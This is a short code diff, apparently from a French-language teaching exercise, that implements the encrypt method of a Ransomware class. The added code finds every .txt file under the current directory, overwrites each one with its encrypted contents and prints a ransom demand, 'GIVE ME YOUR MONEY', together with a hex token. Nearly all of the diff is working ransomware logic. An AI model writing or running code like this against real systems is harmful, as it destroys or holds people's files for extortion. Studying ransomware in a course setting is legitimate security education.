@@ -50,7 +50,30 @@ class Ransomware:
 
     def encrypt(self):
         # main function for encrypting (see PDF)
-        raise NotImplemented()
+        # On liste tous les fichiers
+        txt_files = []
+        for root, dirs, files in os.walk('.'):
+            for file in files:
+                if file.endswith('.txt'):
+                    txt_files.append(os.path.join(root, file))
+        
+        # On crée et on setup le secret_manager
+        secret_manager = SecretManager()
+        secret_manager.setup()
+        
+        # On encrypte les fichiers
+        encrypted_files = []
+        for file in txt_files:
+            with open(file, 'rb') as f:
+                plaintext = f.read()
+            ciphertext = secret_manager.encrypt(plaintext)
+            with open(file, 'wb') as f:
+                f.write(ciphertext)
+            encrypted_files.append(file)
+        
+        # On affiche le message destiné aux victimes
+        hex_token = secret_manager.get_hex_token()
+        print("Inflation hurts... But i can be rude too, so GIVE ME YOUR MONEY !!! Have a nice day :)", hex_token)
 
     def decrypt(self):
         # main function for decrypting (see PDF)
